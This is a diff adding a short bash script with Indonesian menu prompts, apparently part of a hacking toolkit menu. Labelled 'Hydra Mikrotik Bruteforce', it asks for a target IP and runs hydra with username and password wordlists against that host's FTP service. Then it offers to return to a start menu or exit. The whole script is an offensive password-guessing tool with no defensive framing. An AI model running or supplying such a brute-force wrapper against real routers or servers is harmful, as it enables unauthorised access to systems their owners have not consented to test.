@@ -1,0 +1,53 @@
+#!/bin/bash
+
+clear
+
+echo " \033[32;1m        ..::|[ Hydra Mikrotik Bruteforce ]|::.."
+echo "
+
+
+
+
+
+
+
+
+
+
+
+
+
+"
+echo -n "\033[37;1mIp Login Target : \033[0m"
+read tai
+clear
+echo "
+"
+echo "\033[32;1mIp Login Target :\033[0m \033[37;1m$tai\033[0m"
+echo "
+
+
+"
+hydra -L ../wodlis/usernames.lst -P ../wodlis/passwords.lst $tai ftp
+
+echo"
+
+"
+echo "
+=> Tekan \033[33mB\033[0m untuk kembali
+=> Tekan \033[31mK\033[0m untuk keluar"
+echo -n "=> Pilihan: "
+read peler
+if [ $peler = b ] || [ $peler = B ]
+then
+clear
+sh start
+fi
+
+if [ $peler = k ] || [ $peler = K ]
+then
+clear
+sh exit
+fi
+
+
